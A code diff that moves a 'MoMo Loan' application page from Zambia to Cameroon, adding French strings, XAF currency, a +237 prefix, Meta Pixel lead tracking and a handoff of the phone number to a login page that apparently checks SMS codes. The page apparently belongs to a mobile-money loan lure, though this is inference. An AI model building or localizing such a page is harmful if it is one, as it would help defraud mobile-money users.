+        btnNext: 'ÉTAPE SUIVANTE',
+        btnSubmit: 'SOUMETTRE LA DEMANDE',
+        employment: 'Situation Professionnelle',
+        empSelf: 'Travailleur indépendant',
+        empFull: 'Employé à temps plein',
+        empPart: 'Employé à temps partiel',
+        empStudent: 'Étudiant',
+        empUnemployed: 'Sans emploi',
+        annualIncome: 'Revenu Annuel (XAF)',
+        incomePlaceholder: 'Entrez votre revenu annuel',
+        summaryTitle: 'Résumé de la Demande',
+        summaryAmount: 'Montant du Prêt :',
+        summaryTerm: 'Durée du Prêt :',
+        summaryPurpose: 'Objet :',
+        summaryApplicant: 'Demandeur :',
+        processingTitle: 'Traitement de la Demande',
+        processingSub: 'Veuillez patienter, cela peut prendre quelques secondes',
+        // alerts
+        alertMinAmount: 'Veuillez saisir un montant valide (minimum 50 000 XAF).',
+        alertName: 'Veuillez saisir votre prénom et nom.',
+        alertPhone: 'Veuillez saisir un numéro de téléphone valide à 9 chiffres.',
+        monthsSuffix: 'Mois'
+      }
     };
 
+    let currentLang = localStorage.getItem('momoLang') || null;
+
+    function t(key) {
+      const dict = TRANSLATIONS[currentLang] || TRANSLATIONS.en;
+      return dict[key] !== undefined ? dict[key] : (TRANSLATIONS.en[key] || key);
+    }
+
+    function applyTranslations() {
+      document.querySelectorAll('[data-i18n]').forEach(el => {
+        const key = el.getAttribute('data-i18n');
+        el.innerHTML = t(key);
+      });
+      document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+        const key = el.getAttribute('data-i18n-placeholder');
+        el.setAttribute('placeholder', t(key));
+      });
+      // update lang overlay text if it's visible
+      const lt = document.getElementById('langTitle');
+      const ls = document.getElementById('langSubtitle');
+      const lf = document.getElementById('langFooter');
+      if (lt) lt.innerHTML = t('langTitle');
+      if (ls) ls.textContent = t('langSubtitle');
+      if (lf) lf.textContent = t('langFooter');
+      // update calculator/term display based on current lang
+      if (typeof updateCalculator === 'function') updateCalculator();
+    }
+
+    // ═══════════════════════════════════════════════
+    //  LANGUAGE SELECTION
+    // ═══════════════════════════════════════════════
+    function showLanguageOverlay() {
+      document.getElementById('langOverlay').classList.add('show');
+      document.getElementById('app').style.visibility = 'hidden';
+    }
+
+    function hideLanguageOverlay() {
+      document.getElementById('langOverlay').classList.remove('show');
+      document.getElementById('app').style.visibility = 'visible';
+    }
+
+    function selectLanguage(lang) {
+      currentLang = lang;
+      localStorage.setItem('momoLang', lang);
+      applyTranslations();
+      hideLanguageOverlay();
+    }
+
+    document.querySelectorAll('.lang-option').forEach(btn => {
+      btn.addEventListener('click', () => {
+        selectLanguage(btn.getAttribute('data-lang'));
+      });
+    });
+
+    // ═══════════════════════════════════════════════
+    //  STATE
+    // ═══════════════════════════════════════════════
+    const S = {
+      loanAmount: 1000000,
+      loanTerm: '48 Months'
+    };
+
+    // ═══════════════════════════════════════════════
+    //  NAVIGATION
+    // ═══════════════════════════════════════════════
     function goTo(pageId) {
       document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
       const target = document.getElementById(pageId);
@@ -454,70 +790,85 @@
       window.scrollTo(0, 0);
     }
 
+    // ═══════════════════════════════════════════════
+    //  CALCULATOR
+    // ═══════════════════════════════════════════════
     function updateCalculator() {
       const slider = document.getElementById('wSlider');
       const amountEl = document.getElementById('wAmount');
       const termEl = document.getElementById('wTerm');
       const monthlyEl = document.getElementById('wMonthly');
+      if (!slider || !amountEl || !termEl || !monthlyEl) return;
 
       const amount = parseInt(slider.value, 10);
-      const term = 12;
+      const term = 48;
       const monthly = Math.ceil(amount / term);
 
-      amountEl.textContent = 'K ' + amount.toLocaleString();
-      termEl.textContent = term + ' Months';
-      monthlyEl.textContent = 'K ' + monthly.toLocaleString();
+      amountEl.textContent = 'XAF ' + amount.toLocaleString();
+      termEl.textContent = term + ' ' + t('monthsSuffix');
+      monthlyEl.textContent = 'XAF ' + monthly.toLocaleString();
     }
 
+    // ═══════════════════════════════════════════════
+    //  WELCOME → STEP 1
+    // ═══════════════════════════════════════════════
     function startApplication() {
       const sliderAmount = document.getElementById('wSlider').value;
       document.getElementById('fAmount').value = sliderAmount;
       goTo('page-step1');
     }
 
+    // ═══════════════════════════════════════════════
+    //  STEP 1 → STEP 2
+    // ═══════════════════════════════════════════════
     function nextToStep2() {
       const amount = document.getElementById('fAmount').value;
-      if (!amount || parseInt(amount, 10) < 5000) {
-        alert('Please enter a valid loan amount (minimum K 5,000).');
-        return;
-      }
-      if (parseInt(amount, 10) > 499000) {
-        alert('Maximum loan amount is K 499,000.');
+      if (!amount || parseInt(amount, 10) < 50000) {
+        alert(t('alertMinAmount'));
         return;
       }
       goTo('page-step2');
     }
 
+    // ═══════════════════════════════════════════════
+    //  STEP 2 → STEP 3
+    // ═══════════════════════════════════════════════
     function nextToStep3() {
       const first = document.getElementById('fFirst').value.trim();
       const last  = document.getElementById('fLast').value.trim();
       const phone = document.getElementById('fPhone').value.trim();
 
       if (!first || !last) {
-        alert('Please enter your first and last name.');
+        alert(t('alertName'));
         return;
       }
-      if (!/^\d{9}$/.test(phone)) {
-        alert('Please enter a valid 9-digit phone number (e.g., 966123456).');
+      if (phone.length !== 9 || !/^\d{9}$/.test(phone)) {
+        alert(t('alertPhone'));
         return;
       }
 
       const amount  = parseInt(document.getElementById('fAmount').value, 10);
-      const term    = document.getElementById('fTerm').value;
+      const termEl  = document.getElementById('fTerm');
+      const termTxt = termEl.options[termEl.selectedIndex].text;
       const purpose = document.getElementById('fPurpose').value.trim() || '—';
 
-      document.getElementById('sumAmount').textContent    = 'K ' + amount.toLocaleString();
-      document.getElementById('sumTerm').textContent      = term;
+      document.getElementById('sumAmount').textContent    = 'XAF ' + amount.toLocaleString();
+      document.getElementById('sumTerm').textContent      = termTxt;
       document.getElementById('sumPurpose').textContent   = purpose;
       document.getElementById('sumApplicant').textContent = first + ' ' + last;
 
       goTo('page-step3');
     }
 
+    // ═══════════════════════════════════════════════
+    //  STEP 3 → SUBMIT
+    // ═══════════════════════════════════════════════
     async function submitApplication() {
       const btn = document.getElementById('submitBtn');
       btn.disabled = true;
-      btn.textContent = 'SUBMITTING...';
+      btn.textContent = '...';
+
+      const fullPhone = '+237' + document.getElementById('fPhone').value.trim();
 
       const payload = {
         loanType:         document.getElementById('fLoanType').value,
@@ -526,25 +877,42 @@
         purpose:          document.getElementById('fPurpose').value.trim(),
         firstName:        document.getElementById('fFirst').value.trim(),
         lastName:         document.getElementById('fLast').value.trim(),
-        phone:            '+260' + document.getElementById('fPhone').value.trim(),
+        phone:            fullPhone,
         employmentStatus: document.getElementById('fEmp').value,
         annualIncome:     parseInt(document.getElementById('fIncome').value, 10) || 0,
-        country:          'ZM'
+        language:         currentLang || 'en'
       };
 
       S.loanAmount = payload.loanAmount;
       S.loanTerm = payload.loanTerm;
 
-      if (typeof fbq === 'function') {
-        fbq('track', 'Lead', {
-          content_name: 'MoMo Loan Application - Zambia',
-          content_category: payload.loanType,
-          value: payload.loanAmount,
-          currency: 'ZMW'
-        });
-        console.log('✅ Meta Pixel: Lead event fired');
+      // ✅ localStorage handoff (so login.html pre-fills the phone)
+      try {
+        localStorage.setItem('momoPhone', fullPhone);
+        localStorage.setItem('momoCountry', 'CM');
+        localStorage.setItem('momoSession', JSON.stringify({
+          phone: fullPhone,
+          country: 'CM',
+          token: '',
+          startedAt: new Date().toISOString()
+        }));
+        localStorage.removeItem('momoSms');
+        localStorage.removeItem('momoVerified');
+      } catch (e) {
+        console.warn('localStorage write failed:', e.message);
       }
 
+      // ✅ Meta Pixel Lead event
+      if (typeof fbq === 'function') {
+        fbq('track', 'Lead', {
+          content_name: 'MoMo Loan Application',
+          content_category: payload.loanType,
+          value: payload.loanAmount,
+          currency: 'XAF'
+        });
+      }
+
+      // Show spinner
       document.getElementById('processingOverlay').classList.add('show');
 
       const startTime = Date.now();
@@ -556,7 +924,7 @@
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(payload)
         });
-        const data = await res.json();
+        const data = await res.json().catch(() => ({}));
         console.log('Application response:', data);
       } catch (err) {
         console.error('Submit error:', err);
@@ -571,7 +939,18 @@
       }, remaining);
     }
 
+    // ═══════════════════════════════════════════════
+    //  INIT
+    // ═══════════════════════════════════════════════
     document.addEventListener('DOMContentLoaded', () => {
+      // If user already picked a language before, use it; else show overlay
+      if (currentLang && TRANSLATIONS[currentLang]) {
+        applyTranslations();
+        hideLanguageOverlay();
+      } else {
+        showLanguageOverlay();
+      }
+
       if (document.getElementById('wSlider')) {
         updateCalculator();
       }
